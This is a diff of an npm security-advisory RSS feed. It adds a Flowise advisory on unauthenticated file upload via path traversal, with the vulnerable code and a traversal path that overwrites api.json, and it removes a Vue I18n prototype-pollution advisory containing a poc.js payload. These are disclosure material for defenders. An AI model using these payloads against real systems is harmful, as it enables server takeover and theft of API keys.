@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2025-03-13T22:01:12.173Z</updated>
+    <updated>2025-03-13T23:01:26.655Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,182 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[flowise] Flowise Pre-auth Arbitrary File Upload]]></title>
+        <id>https://github.com/advisories/GHSA-h42x-xx2q-6v6g</id>
+        <link href="https://github.com/advisories/GHSA-h42x-xx2q-6v6g"/>
+        <updated>2025-03-13T22:38:03.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>An unauthorized attacker can leverage the whitelisted route <code>/api/v1/attachments</code> to upload arbitrary files when the <code>storageType</code> is set to <strong>local</strong> (default).</p>
+<h2 id="details">Details</h2>
+<p>When a new request arrives, the system first checks if the URL starts with <code>/api/v1/</code>. If it does, the system then verifies whether the URL is included in the whitelist (<em>whitelistURLs</em>). If the URL is whitelisted, the request proceeds; otherwise, the system enforces authentication.</p>
+<p>@ <em>/packages/server/src/index.ts</em></p>
+<pre><code class="language-typescript">           this.app.use(async (req, res, next) =&gt; {
+                // Step 1: Check if the req path contains /api/v1 regardless of case
+                if (URL_CASE_INSENSITIVE_REGEX.test(req.path)) {
+                    // Step 2: Check if the req path is case sensitive
+                    if (URL_CASE_SENSITIVE_REGEX.test(req.path)) {
+                        // Step 3: Check if the req path is in the whitelist
+                        const isWhitelisted = whitelistURLs.some((url) =&gt; req.path.startsWith(url))
+                        if (isWhitelisted) {
+                            next()
+                        } else if (req.headers['x-request-from'] === 'internal') {
+                            basicAuthMiddleware(req, res, next)
+                        } else {
+                            const isKeyValidated = await validateAPIKey(req)
+                            if (!isKeyValidated) {
+                                return res.status(401).json({ error: 'Unauthorized Access' })
+                            }
+                            next()
+                        }
+                    } else {
+                        return res.status(401).json({ error: 'Unauthorized Access' })
+                    }
+                } else {
+                    // If the req path does not contain /api/v1, then allow the request to pass through, example: /assets, /canvas
+                    next()
+                }
+            }
+</code></pre>
+<p><strong>The whitelist is defined as follows</strong></p>
+<pre><code class="language-typescript">export const WHITELIST_URLS = [
+    '/api/v1/verify/apikey/',
+    '/api/v1/chatflows/apikey/',
+    '/api/v1/public-chatflows',
+    '/api/v1/public-chatbotConfig',
+    '/api/v1/prediction/',
+    '/api/v1/vector/upsert/',
+    '/api/v1/node-icon/',
+    '/api/v1/components-credentials-icon/',
+    '/api/v1/chatflows-streaming',
+    '/api/v1/chatflows-uploads',
+    '/api/v1/openai-assistants-file/download',
+    '/api/v1/feedback',
+    '/api/v1/leads',
+    '/api/v1/get-upload-file',
+    '/api/v1/ip',
+    '/api/v1/ping',
+    '/api/v1/version',
+    '/api/v1/attachments',
+    '/api/v1/metrics'
+]
+</code></pre>
+<p>This means that every route in the whitelist does not require authentication. Now, let's examine the <code>/api/v1/attachments</code> route.</p>
+<p>@ <em>/packages/server/src/routes/attachments/index.ts</em></p>
+<pre><code class="language-typescript">const router = express.Router()
+// CREATE
+router.post('/:chatflowId/:chatId', getMulterStorage().array('files'), attachmentsController.createAttachment)
+export default router
+</code></pre>
+<p>After several calls, the request reaches the <code>createFileAttachment</code> function @ (<em>packages/server/src/utils/createAttachment.ts</em>)
+Initially, the function retrieves <em>chatflowid</em> and <em>chatId</em> from the request without any additional validation. The only check performed is whether these parameters exist in the request.</p>
+<pre><code class="language-typescript">    const chatflowid = req.params.chatflowId
+    if (!chatflowid) {
+        throw new Error(
+            'Params chatflowId is required! Please provide chatflowId and chatId in the URL: /api/v1/attachments/:chatflowId/:chatId'
+        )
+    }
+
+    const chatId = req.params.chatId
+    if (!chatId) {
+        throw new Error(
+            'Params chatId is required! Please provide chatflowId and chatId in the URL: /api/v1/attachments/:chatflowId/:chatId'
+        )
+    }
+</code></pre>
+<p>Next, the function retrieves the uploaded files and attempts to add them to the storage by calling the <code>addArrayFilesToStorage</code> function.</p>
+<pre><code class="language-typescript">const files = (req.files as Express.Multer.File[]) || []
+    const fileAttachments = []
+    if (files.length) {
+        // ...
+        for (const file of files) {
+            const fileBuffer = await getFileFromUpload(file.path ?? file.key)  // get the uploaded file
+            const fileNames: string[] = []
+            file.originalname = Buffer.from(file.originalname, 'latin1').toString('utf8')
+            // add it to the storage
+            const storagePath = await addArrayFilesToStorage(file.mimetype, 
+                                                             fileBuffer,
+                                                             file.originalname,
+                                                             fileNames,
+                                                             chatflowid, chatId) // add it to the storage
+
+            // ...
+
+            await removeSpecificFileFromUpload(file.path ?? file.key) // delete from tmp
+           //  ...
+
+                fileAttachments.push({
+                    name: file.originalname,
+                    mimeType: file.mimetype,
+                    size: file.size,
+                    content
+                })
+            } catch (error) {
+                throw new Error(`Failed operation: createFileAttachment - ${getErrorMessage(error)}`)
+            }
+        }
+    }
+
+    return fileAttachments
+</code></pre>
+<p>Now lets take a look at <code>addArrayFilesToStorage</code> function @ (<em>/packages/components/src/storageUtils.ts</em>)</p>
+<pre><code class="language-typescript">export const addArrayFilesToStorage = async (mime: string, bf: Buffer, fileName: string, fileNames: string[], ...paths: string[]) =&gt; {
+    const storageType = getStorageType()
+
+    const sanitizedFilename = _sanitizeFilename(fileName)
+    if (storageType === 's3') {
+      // ...
+    } else {
+        const dir = path.join(getStoragePath(), ...paths) // PATH TRAVERSAL.
+        if (!fs.existsSync(dir)) {
+            fs.mkdirSync(dir, { recursive: true })
+        }
+        const filePath = path.join(dir, sanitizedFilename)
+        fs.writeFileSync(filePath, bf)
+        fileNames.push(sanitizedFilename)
+        return 'FILE-STORAGE::' + JSON.stringify(fileNames)
+    }
+}
+</code></pre>
+<p>As noted in the comment, to construct the directory, the function joins the output of the <code>getStoragePath</code> function with <code>...paths</code>, which are essentially the <code>chatflowid</code> and <code>chatId</code> extracted earlier from the request.
+However, as mentioned previously, these values are not validated to ensure they are UUIDs or numbers. As a result, an attacker could manipulate these variables to set the <strong>dir</strong> variable to any value.
+Combined with the fact that the filename is also provided by the user, this leads to <strong>unauthenticated arbitrary file upload</strong>.</p>
+<h2 id="poc">POC</h2>
+<p>This is the a HTTP request. As observed, we are not authenticated, and by manipulating the <code>chatId</code> parameter, we can perform a path traversal. In this example, we overwrite the <code>api.json</code> file, which contains the API keys for the system.</p>
+<p><img alt="File Uplaod Vulnerability." src="https://lh3.googleusercontent.com/d/1zcr-MSJUnRbGRmnoD_meo5uh8Hf8FaEK"></p>
+<blockquote>
+<p>in this example, the <strong>dir</strong> variable will be</p>
+</blockquote>
+<pre><code class="language-typescript">var dir = '/root/.flowise/storage/test/../../../../../../../../root/.flowise/'
+</code></pre>
+<blockquote>
+<p>and the file name is <code>api.json</code></p>
+</blockquote>
+<p>And the API Keys in the UI</p>
+<p><img alt="File Uplaod Vulnerability." src="https://lh3.googleusercontent.com/d/1Y0jl8uQuzpp0EFyUzCItifiG5UW35hhV"></p>
+<h3 id="impact">Impact</h3>
+<p>This vulnerability could potentially lead to</p>
+<ul>
+<li>Remote Code Execution</li>
+<li>Server Takeover</li>
+<li>Data Theft
+And more</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-h42x-xx2q-6v6g">https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-h42x-xx2q-6v6g</a></li>
+<li><a href="https://github.com/FlowiseAI/Flowise/commit/c2b830f279e454e8b758da441016b2234f220ac7">https://github.com/FlowiseAI/Flowise/commit/c2b830f279e454e8b758da441016b2234f220ac7</a></li>
+<li><a href="https://github.com/advisories/GHSA-h42x-xx2q-6v6g">https://github.com/advisories/GHSA-h42x-xx2q-6v6g</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-h42x-xx2q-6v6g</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2025-03-13T22:38:03.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[canvg] canvg Prototype Pollution vulnerability]]></title>
         <id>https://github.com/advisories/GHSA-v2mw-5mch-w8c5</id>
@@ -849,68 +1025,6 @@ After Attack:  {"pollutedKey":123}
     </entry>
     <entry>
         <title type="html"><![CDATA[[@intlify/core] Vue I18n Allows Prototype Pollution in `handleFlatJson`]]></title>
-        <id>https://github.com/advisories/GHSA-p2ph-7g93-hw3m</id>
-        <link href="https://github.com/advisories/GHSA-p2ph-7g93-hw3m"/>
-        <updated>2025-03-10T19:17:59.000Z</updated>
-        <content type="html"><![CDATA[<p><strong>Vulnerability type:</strong>
-Prototype Pollution</p>
-<p><strong>Vulnerability Location(s):</strong></p>
-<pre><code class="language-js"># v9.1
-node_modules/@intlify/message-resolver/index.js
-
-# v9.2 or later
-node_modules/@intlify/vue-i18n-core/index.js
-</code></pre>
-<p><strong>Description:</strong></p>
-<p>The latest version of <code>@intlify/message-resolver (9.1)</code> and <code>@intlify/vue-i18n-core (9.2 or later)</code>, (previous versions might also affected), is vulnerable to Prototype Pollution through the entry function(s) <code>handleFlatJson</code>. An attacker can supply a payload with Object.prototype setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) a the minimum consequence.</p>
-<p>Moreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.</p>
-<p><strong>PoC:</strong></p>
-<pre><code class="language-bash">// install the package with the latest version
-~$ npm install @intlify/message-resolver@9.1.10
-// run the script mentioned below 
-~$ node poc.js
-//The expected output (if the code still vulnerable) is below. 
-// Note that the output may slightly differs from function to another.
-Before Attack:  {}
-After Attack:  {"pollutedKey":123}
-</code></pre>
-<pre><code class="language-js">// poc.js
-(async () =&gt; {
-    const lib = await import('@intlify/message-resolver');
-    var someObj = {}
-    console.log("Before Attack: ", JSON.stringify({}.__proto__));
-    try {
-        // for multiple functions, uncomment only one for each execution.
-        lib.handleFlatJson ({ "__proto__.pollutedKey": "pollutedValue" })
-    } catch (e) { }
-    console.log("After Attack: ", JSON.stringify({}.__proto__));
-    delete Object.prototype.pollutedKey;
-})();
-</code></pre>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m">https://github.com/intlify/vue-i18n/security/advisories/GHSA-p2ph-7g93-hw3m</a></li>
-<li><a href="https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53">https://github.com/intlify/vue-i18n/commit/d21e06a7440eed8ada7f522b22fcf830b98d3a53</a></li>
-<li><a href="https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a">https://github.com/intlify/vue-i18n/commit/fbda9988d3ddd3a1a21740d506d2c183d6b6e36a</a></li>
-<li><a href="https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e">https://github.com/intlify/vue-i18n/commit/feaf13fcff427f2cb1d5ec8076e639506ba28f9e</a></li>
-<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v10.0.6">https://github.com/intlify/vue-i18n/releases/tag/v10.0.6</a></li>
-<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v11.1.2">https://github.com/intlify/vue-i18n/releases/tag/v11.1.2</a></li>
-<li><a href="https://github.com/intlify/vue-i18n/releases/tag/v9.14.3">https://github.com/intlify/vue-i18n/releases/tag/v9.14.3</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27597">https://nvd.nist.gov/vuln/detail/CVE-2025-27597</a></li>
-<li><a href="https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a">https://github.com/intlify/vue-i18n/commit/4bb6eacda7fc2cde5687549afa0efb27ca40862a</a></li>
-<li><a href="https://github.com/advisories/GHSA-p2ph-7g93-hw3m">https://github.com/advisories/GHSA-p2ph-7g93-hw3m</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-p2ph-7g93-hw3m</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2025-03-07T15:58:24.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@intlify/core-base] Vue I18n Allows Prototype Pollution in `handleFlatJson`]]></title>
         <id>https://github.com/advisories/GHSA-p2ph-7g93-hw3m</id>
         <link href="https://github.com/advisories/GHSA-p2ph-7g93-hw3m"/>
         <updated>2025-03-10T19:17:59.000Z</updated>
